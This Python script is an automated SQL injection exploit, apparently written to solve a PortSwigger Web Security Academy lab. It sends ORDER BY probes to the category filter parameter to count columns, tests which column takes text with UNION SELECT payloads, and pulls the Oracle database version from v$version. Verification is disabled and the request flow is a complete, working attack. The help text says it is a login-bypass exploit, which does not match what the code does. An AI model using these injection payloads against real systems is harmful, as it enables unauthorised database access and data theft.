import requests, urllib3, sys, argparse
from bs4 import BeautifulSoup
from banner import banner

# Disable SSL/TLS warnings to keep the terminal clean when using
# interception proxies like Burp Suite.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Optional Proxy Configuration:
# Uncomment PROXIES and add 'proxies=PROXIES' to requests.get to intercept
# traffic for further manual analysis.
# PROXIES = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}


def check_url(url):
    if url[-1] == '/':
        url = url[:-1]
    return url

def exploit(url):
    print(f'[INFO] Determining the column count...\n')
    for i in range(1, 6):
        r= requests.get(url=url + f'/filter?category=Gifts\' ORDER BY {i} --', verify=False)  # , proxies=PROXIES
        if r.status_code == 500:
            num_columns = i - 1
            print(f'[+] The table has {num_columns} columns.\n')
            break
    
    print('[INFO] Evaluating the data type of each column...\n')
    

    for i in range(num_columns):
        payload_list = ['NULL'] * num_columns
        payload_list[i] = '\'a\''
        payload = ", ".join(payload_list)
        print(f"[INFO] Trying payload: UNION SELECT {payload} FROM DUAL --\n")
        r = requests.get(url=url + f'/filter?category=Gifts\' UNION SELECT {payload} FROM DUAL --', verify=False)  # , proxies=PROXIES

        if r.status_code == 200:
            print(f'[+] The column {i + 1} is injectable\n')
            payload_list[i] = 'banner'
            payload = ", ".join(payload_list)
            break

    final_payload = f'{url}/filter?category=test\' UNION SELECT {payload} FROM v$version --'
    print(f'[INFO] Executing exploit at "{final_payload}" ...\n')
    r = requests.get(url=final_payload, verify=False)  # , proxies=PROXIES
    soup = BeautifulSoup(r.text, 'html.parser')

    table = soup.find('table', class_='is-table-longdescription')

    try:
        if 'PL/SQL' in table.text:
            print('[+] SUCCESS! The exploit was successful, and the lab has been solved.\n' \
            '[+] You can copy de URL in your browser\'s address bar to watch the result.')
    except TypeError as e:
        print(f'[-] The table is empty: {e}\n')
        print('[-] Error: The exploit failed to retrieve the data.')


def main(url):
    try:
        banner()
    except Exception:
        pass

    url = check_url(url)

    exploit(url)


if __name__=="__main__":
    parser = argparse.ArgumentParser(description="Python exploit for PortSwigger\'s SQLi lab: Bypassing login form.")

    parser.add_argument('-t', '--target', required=True,
                        help="Target Domain | Example: https://example.com")
    
    args = parser.parse_args()

    main(args.target)